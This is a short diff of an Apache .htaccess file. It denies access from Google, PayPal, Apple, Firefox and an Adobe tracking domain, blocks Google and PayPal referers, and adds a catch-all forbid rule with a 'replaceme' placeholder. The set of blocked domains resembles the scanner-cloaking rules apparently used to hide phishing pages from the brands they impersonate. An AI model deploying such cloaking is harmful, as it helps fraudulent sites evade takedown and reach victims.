@@ -2,13 +2,15 @@
 	 ServerSignature Off
 	 Options -Indexes
 	 order allow,deny
+	 
 	 deny from google.com
 	 deny from paypal.com
 	 deny from 112.2o7.com
 	 deny from firefox.com
 	 deny from apple.com
 	 deny from env=stealthed
-	 
+	 RewriteRule .* replaceme [F]
+	  
 	 RewriteCond %{HTTP_REFERER} google\.com [NC,OR]
 	 RewriteCond %{HTTP_REFERER} google\.com
 	 RewriteCond %{HTTP_REFERER} paypal\.com
